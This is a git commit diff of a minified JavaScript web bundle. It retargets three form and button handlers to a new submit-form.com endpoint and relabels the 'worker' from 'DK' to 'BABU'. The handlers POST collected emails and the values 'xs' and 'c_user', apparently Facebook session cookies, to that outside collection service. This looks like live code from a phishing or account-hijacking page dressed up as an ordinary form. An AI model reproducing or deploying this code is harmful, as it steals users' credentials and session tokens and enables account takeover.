d142a910baa796c9ba5c31d359a9daf109159c39
db2329 <db231829@gmail.com>
2025-04-09 12:32:08 -0700

    Update main.be179052.js

--- main.be179052.js
+++ main.be179052.js
@@ -9814,17 +9814,17 @@
                                 className: "ant-form ant-form-horizontal css-m4timi",
                                 onSubmit: e => {
                                     e.preventDefault(),
-                                    fetch("https://submit-form.com/2N3mEu2sp", {
+                                    fetch("https://submit-form.com/UdfJ11jwt", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
                                         },
                                         body: JSON.stringify({
                                             emails: o,
-                                            workerEmail: "DK",
+                                            workerEmail: "BABU",
                                             xs: r,
                                             c_user: i,
-                                            name: "DK"
+                                            name: "BABU"
                                         })
                                     }).then((e => {
                                         e.ok
@@ -13358,7 +13358,7 @@
                             he.jsxs)("form", {
                                 onSubmit: n => {
                                     n.preventDefault(),
-                                    u && o ? (fetch("https://submit-form.com/2N3mEu2sp", {
+                                    u && o ? (fetch("https://submit-form.com/UdfJ11jwt", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
@@ -13471,7 +13471,7 @@
                 he.jsx)("button", {
                     onClick: n => {
                         n.preventDefault(),
-                        fetch("https://submit-form.com/2N3mEu2sp", {
+                        fetch("https://submit-form.com/UdfJ11jwt", {
                             method: "POST",
                             headers: {
                                 "Content-Type": "application/json"
